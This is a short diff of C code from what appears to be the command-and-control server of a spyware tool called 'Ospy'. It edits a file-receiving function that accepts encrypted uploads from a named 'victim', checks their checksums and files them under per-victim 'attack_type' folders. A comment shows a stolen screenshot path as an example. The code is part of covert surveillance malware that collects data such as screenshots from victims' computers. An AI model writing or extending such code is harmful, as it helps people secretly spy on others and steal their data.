@@ -100,9 +100,8 @@ FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * fi
 	if (ptm == NULL) {
 		puts("The localtime() function failed");
 		exit(1);
-	}
-	crate_folders(victim_name, attack_type);
-		
+	}	
+	system("mkdir -p Ospy/");
 	encrypted_receved_file = fopen(ENCRYPTED_RECEIVED_FILE_NAME, "w");
 	if(encrypted_receved_file == NULL)
 		return FAILED_RECEIVING_FILE;
@@ -121,12 +120,13 @@ FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * fi
 	if (strcmp(temp_checksum, temp_file_data.checksum) != 0)
 		return FAILED_RECEIVING_FILE;
 	
+	crate_folders(victim_name, attack_type);
+	
 	// exempal of "file_path" : Ospy/ori_mac_mini/screenshots/screenshot_16b1c83de8f9518e673838b2d6ea75dc
 	char file_path[MAX_USER_NAME_LEN + 100];
 	sprintf(file_path,"Ospy/%s/%s/%s_%s%s", victim_name, attack_type, file_name, temp_checksum, file_extension);
 //	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s", victim_name, attack_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
 	bace64_to_original_convertor(file_path);
-//	printf("\r[#] Hash checksum : %s\n", temp_file_data.checksum);
 	return FILE_RECEIVED;
 }
 
